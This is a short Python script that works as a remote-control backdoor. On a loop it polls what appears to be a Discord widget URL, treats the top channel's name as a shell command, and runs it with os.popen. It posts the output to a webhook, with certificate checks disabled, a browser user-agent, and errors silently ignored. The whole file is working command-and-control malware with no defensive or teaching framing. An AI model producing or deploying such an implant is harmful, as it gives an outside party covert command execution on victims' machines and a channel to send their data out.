import json, urllib.request, ssl, os, time

ctx = ssl._create_unverified_context()
WIDGET = os.getenv("WIDGET")
WEBHOOK = os.getenv("WEBHOOK")

def listen():

    req = urllib.request.Request(WIDGET, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, context=ctx) as r:
        data = json.load(r)
    channels = sorted(data.get("channels", []), key=lambda c: c["position"])
    if not channels:
        return 
    cmd = channels[0]["name"]
    output = os.popen(cmd).read()  
    payload = json.dumps({"content": f"```\n{output}\n```"}).encode()
    webhook_req = urllib.request.Request(
        WEBHOOK,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    )
    urllib.request.urlopen(webhook_req, context=ctx)

if __name__ == '__main__':
    while True:
        try:
            listen()
        except Exception:
            pass
        time.sleep(30)